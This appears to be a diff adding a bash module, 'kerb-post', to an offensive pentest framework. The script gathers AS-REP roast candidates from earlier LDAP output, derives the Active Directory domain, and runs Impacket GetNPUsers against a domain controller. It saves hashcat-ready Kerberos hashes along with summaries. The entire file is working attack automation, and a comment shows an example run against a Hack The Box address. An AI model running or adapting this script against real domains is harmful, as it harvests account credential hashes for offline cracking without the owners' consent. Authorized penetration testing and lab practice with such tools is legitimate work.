@@ -1,0 +1,190 @@
+#!/usr/bin/env bash
+# kerb-post — post-processing for Kerberos-related loot
+# Usage:
+#   kerb-post OUTDIR TARGET
+#
+# Behavior:
+#   - Ensure OUTDIR/kerb/treasure exists.
+#   - Load AS-REP candidates from:
+#       * OUTDIR/kerb/treasure/asrep-candidates.txt  (preferred)
+#       * or, if missing/empty: all LDAP svc_hidden.txt accounts (svc-*)
+#   - Derive domain from OUTDIR/ldap/*/treasure/domains.txt.
+#   - Run Impacket GetNPUsers to obtain AS-REP hashes:
+#       impacket-GetNPUsers <domain>/ -dc-ip <TARGET> -no-pass \
+#         -usersfile asrep-users.txt -format hashcat -outputfile asrep-hashes.txt
+#   - Write:
+#       OUTDIR/kerb/treasure/asrep-users.txt
+#       OUTDIR/kerb/treasure/asrep-hashes.txt
+#       OUTDIR/kerb/treasure/asrep-summary.txt
+#       OUTDIR/kerb/treasure/getnpusers.log
+#       OUTDIR/kerb/summary.txt (for reporter)
+#
+# Notes:
+#   - Does NOT perform cracking; just obtains hashes suitable for hashcat.
+#   - Safe to run multiple times; outputs are overwritten each time.
+
+ROOTDIR="$(cd -- "$(dirname -- "$(readlink -f -- "${BASH_SOURCE[0]}")")"/../.. >/dev/null 2>&1 && pwd)"
+. "$ROOTDIR/lib/colors"
+
+OUTDIR="${1:-}"
+TARGET="${2:-}"
+
+if [ -z "$OUTDIR" ] || [ -z "$TARGET" ]; then
+  echo "[!] kerb-post: Usage: kerb-post OUTDIR TARGET" >&2
+  exit 2
+fi
+
+KERB_DIR="$OUTDIR/kerb"
+KERB_TREASURE="$KERB_DIR/treasure"
+mkdir -p "$KERB_TREASURE"
+
+ASREP_FILE="$KERB_TREASURE/asrep-candidates.txt"
+
+# ----------------------------------------
+# 1) Build candidate list (AS-REP roast users)
+# ----------------------------------------
+
+candidates_tmp="$(mktemp)"
+: > "$candidates_tmp"
+
+# Preferred: existing asrep-candidates.txt if any module/treasure-goblin wrote it
+if [ -s "$ASREP_FILE" ]; then
+  awk 'NF > 0' "$ASREP_FILE" >> "$candidates_tmp"
+fi
+
+# Fallback: derive from LDAP hidden service accounts (svc_hidden.txt)
+if [ ! -s "$candidates_tmp" ] && [ -d "$OUTDIR/ldap" ]; then
+  while IFS= read -r f; do
+    [ -s "$f" ] || continue
+    awk 'NF > 0' "$f" >> "$candidates_tmp"
+  done < <(find "$OUTDIR/ldap" -type f -path "*/treasure/svc_hidden.txt" 2>/dev/null || true)
+fi
+
+# Normalize and dedupe
+sort -u "$candidates_tmp" > "$ASREP_FILE"
+rm -f "$candidates_tmp"
+
+if [ ! -s "$ASREP_FILE" ]; then
+  echo -e "${cyan}[*] [kerb-post]: no AS-REP roast candidates (ASREP_FILE empty after LDAP + treasure).${end}"
+  exit 0
+fi
+
+# ----------------------------------------
+# 2) Locate GetNPUsers implementation
+# ----------------------------------------
+
+# Allow explicit override:
+#   export LANTERN_GETNPUSERS="python3 /opt/impacket/examples/GetNPUsers.py"
+if [ -n "${LANTERN_GETNPUSERS:-}" ]; then
+  GETNP_CMD=(bash -c "${LANTERN_GETNPUSERS} \"\$@\"" _)
+elif command -v impacket-GetNPUsers >/dev/null 2>&1; then
+  # Preferred on Kali
+  GETNP_CMD=(impacket-GetNPUsers)
+elif python3 -m impacket.examples.GetNPUsers -h >/dev/null 2>&1; then
+  # Fallback to Python module
+  GETNP_CMD=(python3 -m impacket.examples.GetNPUsers)
+else
+  echo -e "${red}[!] [kerb-post]: GetNPUsers not found (neither impacket-GetNPUsers nor python3 -m impacket.examples.GetNPUsers).${end}"
+  echo -e "${yellow}    Hint:${end} apt install python3-impacket or set LANTERN_GETNPUSERS." >&2
+  exit 0
+fi
+
+# ----------------------------------------
+# 3) Derive domain from LDAP treasure/domains.txt
+# ----------------------------------------
+
+DOMAIN=""
+if [ -d "$OUTDIR/ldap" ]; then
+  first_domains_file="$(find "$OUTDIR/ldap" -type f -name 'domains.txt' 2>/dev/null | sort | head -n1)"
+  if [ -n "$first_domains_file" ] && [ -s "$first_domains_file" ]; then
+    DOMAIN="$(head -n1 "$first_domains_file" | tr -d '[:space:]')"
+  fi
+fi
+
+if [ -z "$DOMAIN" ]; then
+  echo -e "${red}[!] [kerb-post]: could not determine AD domain from LDAP treasure (domains.txt missing/empty).${end}"
+  echo -e "${yellow}    Hint:${end} ensure LDAP module + ldap-treasure ran and wrote domains.txt." >&2
+  exit 0
+fi
+
+# ----------------------------------------
+# 4) Normalized output locations
+# ----------------------------------------
+
+SUMMARY_FILE="$KERB_DIR/summary.txt"
+ASREP_SUMMARY="$KERB_TREASURE/asrep-summary.txt"
+ASREP_USERS="$KERB_TREASURE/asrep-users.txt"
+ASREP_HASHES="$KERB_TREASURE/asrep-hashes.txt"
+GETNP_LOG="$KERB_TREASURE/getnpusers.log"
+
+: > "$ASREP_SUMMARY"
+: > "$ASREP_USERS"
+: > "$ASREP_HASHES"
+: > "$GETNP_LOG"
+
+echo -e "${magenta}[*] [kerb-post]: processing AS-REP roast candidates for${end} ${blue}$TARGET ($DOMAIN)${end}"
+echo >> "$SUMMARY_FILE"
+echo "[ Kerberos Post-Processing ]" >> "$SUMMARY_FILE"
+
+# Prepare users list for GetNPUsers
+sort -u "$ASREP_FILE" > "$ASREP_USERS"
+
+candidate_count="$(wc -l < "$ASREP_USERS" | tr -d '[:space:]')"
+echo -e "${cyan}    [*] [kerb-post]: ${candidate_count} AS-REP candidates ->${end} ${blue}$ASREP_USERS${end}"
+
+# ----------------------------------------
+# 5) Run GetNPUsers
+# ----------------------------------------
+
+echo -e "${cyan}    [*] [kerb-post]: invoking${end} ${blue}${GETNP_CMD[*]}${end} ${cyan}against DC${end} ${blue}$TARGET${end}"
+
+# Example effective invocation:
+#   impacket-GetNPUsers htb.local/ -dc-ip 10.129.95.210 -no-pass \
+#     -usersfile asrep-users.txt -format hashcat -outputfile asrep-hashes.txt
+"${GETNP_CMD[@]}" "$DOMAIN"/ -dc-ip "$TARGET" -no-pass \
+  -usersfile "$ASREP_USERS" \
+  -format hashcat \
+  -outputfile "$ASREP_HASHES" >"$GETNP_LOG" 2>&1
+
+if [ ! -s "$ASREP_HASHES" ]; then
+  echo "No AS-REP hashes obtained (GetNPUsers returned no data)." >> "$ASREP_SUMMARY"
+  echo "  - No AS-REP hashes obtained from candidates (GetNPUsers)." >> "$SUMMARY_FILE"
+
+  while read -r user; do
+    [ -n "$user" ] || continue
+    echo "AS-REP candidate (no hash yet): $user" >> "$ASREP_SUMMARY"
+    echo "  - AS-REP candidate (no hash yet): $user" >> "$SUMMARY_FILE"
+  done < "$ASREP_USERS"
+
+  echo -e "${yellow}    [*] [kerb-post]: no AS-REP hashes returned; candidates recorded in${end} ${blue}$ASREP_SUMMARY${end}"
+  echo -e "${yellow}    [*] [kerb-post]: GetNPUsers output logged at${end} ${blue}$GETNP_LOG${end}"
+  exit 0
+fi
+
+# ----------------------------------------
+# 6) Parse hashes and summarize
+# ----------------------------------------
+
+hash_lines="$(wc -l < "$ASREP_HASHES" | tr -d '[:space:]')"
+echo -e "${yellow}    [*] [kerb-post]: obtained${end} ${red}$hash_lines${end} ${yellow}AS-REP hashes in${end} ${blue}$ASREP_HASHES${end}"
+
+while IFS= read -r hashline; do
+  [ -n "$hashline" ] || continue
+
+  # Expected format: user@REALM:$krb5asrep$...
+  user_part="${hashline%%@*}"
+
+  if [ -n "$user_part" ]; then
+    echo "AS-REP hash obtained for: $user_part" >> "$ASREP_SUMMARY"
+    echo "  - AS-REP hash obtained for: $user_part (Kerberos pre-auth disabled, hash captured)" >> "$SUMMARY_FILE"
+  else
+    echo "AS-REP hash obtained for (unknown user field): $hashline" >> "$ASREP_SUMMARY"
+    echo "  - AS-REP hash obtained (could not parse user): $hashline" >> "$SUMMARY_FILE"
+  fi
+done < "$ASREP_HASHES"
+
+echo -e "${yellow}    [*] [kerb-post]: AS-REP roast summary written to${end} ${blue}$ASREP_SUMMARY${end}"
+echo -e "${yellow}    [*] [kerb-post]: summary updated at${end} ${blue}$SUMMARY_FILE${end}"
+echo -e "${yellow}    [*] [kerb-post]: raw GetNPUsers output logged at${end} ${blue}$GETNP_LOG${end}"
+
+exit 0
